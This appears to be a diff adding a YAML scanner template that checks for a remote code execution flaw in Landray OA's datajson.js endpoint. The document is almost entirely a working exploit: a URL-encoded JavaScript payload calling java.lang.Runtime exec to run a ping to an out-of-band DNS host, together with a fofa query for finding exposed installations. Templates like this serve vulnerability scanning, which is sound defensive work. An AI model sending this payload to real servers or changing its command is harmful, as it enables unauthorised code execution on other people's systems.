@@ -1,0 +1,24 @@
+id: landray-oa-datajson-rce
+
+info:
+  name: Landray OA Datajson RCE
+  author: xpoc
+  severity: critical
+  verified: true
+  description: |-
+    Landray Office Automation (OA) software, specifically in the "s_bean" component's "sysFormulaSimulateByJS" functionality. This vulnerability allows remote code execution (RCE), enabling attackers to execute arbitrary code on a target system.
+    fofa: app="Landray-OA系统"
+  reference:
+    - https://github.com/k3sc/Landray-oa-rce-1/blob/main/poc.py
+    - https://github.com/hktalent/scan4all/blob/main/pocs_go/landray/Landray_RCE.go
+    - https://github.com/zan8in/afrog/v3/blob/main/v2/pocs/afrog-pocs/vulnerability/landray-oa-datajson-rce.yaml
+  tags: landray,rce
+  created: 2023/06/22
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=%66%75%6e%63%74%69%6f%6e%20%74%65%73%74%28%29%7b%20%72%65%74%75%72%6e%20%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%7d%3b%72%3d%74%65%73%74%28%29%3b%72%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%70%69%6e%67%20%2d%63%20%34%20{{oob.DNS}}%22%29&type=1
+    expression: oobCheck(oob.ProtocolDNS, 5)
+expression: r0()
